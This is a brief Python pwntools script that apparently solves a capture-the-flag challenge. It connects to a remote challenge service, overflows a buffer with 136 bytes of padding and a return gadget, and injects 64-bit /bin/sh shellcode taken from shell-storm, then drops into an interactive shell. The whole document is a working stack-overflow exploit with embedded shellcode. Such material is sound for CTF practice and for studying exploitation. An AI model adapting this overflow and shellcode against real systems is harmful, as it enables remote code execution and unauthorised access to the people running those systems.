from pwn import *

conn = remote('challenge.acictf.com',55427)
# conn = process('./cup')

print(conn.recvuntil('\n\n'))
conn.sendline('1')
print(conn.recvuntil('\n'))
buff = 'a'*136
gadget = p64(0x400827)
#shell from shellstorm 64 /bin/sh
shellstorm = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
payload = buff + gadget + shellstorm
conn.sendline(payload)
print(conn.recvuntil('now\n'))
conn.send('1\n')
print(conn.recvuntil('\n\n'))
conn.send('9\n')

conn.interactive()
